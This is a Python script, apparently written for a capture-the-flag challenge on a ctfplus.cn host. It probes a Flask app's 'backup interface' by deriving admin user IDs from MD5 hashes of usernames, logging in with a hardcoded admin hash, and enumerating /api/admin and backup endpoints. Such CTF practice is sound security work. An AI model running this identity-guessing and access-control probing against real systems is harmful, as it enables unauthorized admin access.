import requests
import re
import hashlib

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 深入分析")
print(f"[*] Target: {BASE_URL}")
print()

# 测试1: 尝试所有可能的 admin UID
print("[*] 测试1: 尝试所有可能的 admin UID")

admin_usernames = [
    "admin",
    "administrator",
]

for username in admin_usernames:
    uid = hashlib.md5(username.encode()).hexdigest()
    print(f"    [-] {username} -> {uid}")
    
    # 检查用户是否存在
    profile_resp = session.post(f"{BASE_URL}/api/profile", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    
    print(f"        POST /api/profile: {profile_resp.status_code}")
    
    if profile_resp.status_code == 200:
        print(f"        [+] 用户存在!")
        print(f"        {profile_resp.text}")

print()

# 测试2: 检查 /api/admin 是否有其他参数
print("[*] 测试2: 检查 /api/admin 的参数")

uid = "3553c1effa0b4698895a4874cfbd86d8"  # ADMiN
session.post(f"{BASE_URL}/login", data={"uid": uid})

# 尝试不同的参数
admin_params = [
    {},
    {"uid": uid},
]

for params in admin_params:
    resp = session.get(f"{BASE_URL}/api/admin", params=params)
    print(f"    GET /api/admin {params}: {resp.status_code}")
    if resp.status_code != 403:
        print(f"        {resp.text[:300]}")

print()

# 测试3: 检查是否有其他 API 路由
print("[*] 测试3: 检查其他 API 路由")

api_endpoints = [
    "/api/backup",
    "/api/admin/backup",
]

for endpoint in api_endpoints:
    # GET
    resp = session.get(f"{BASE_URL}{endpoint}")
    if resp.status_code != 404:
        print(f"    [+] GET {endpoint}: {resp.status_code}")
        print(f"    {resp.text[:300]}")
    
    # POST
    resp = session.post(f"{BASE_URL}{endpoint}")
    if resp.status_code != 404:
        print(f"    [+] POST {endpoint}: {resp.status_code}")
        print(f"    {resp.text[:300]}")

print()

print("[*] 测试完成")
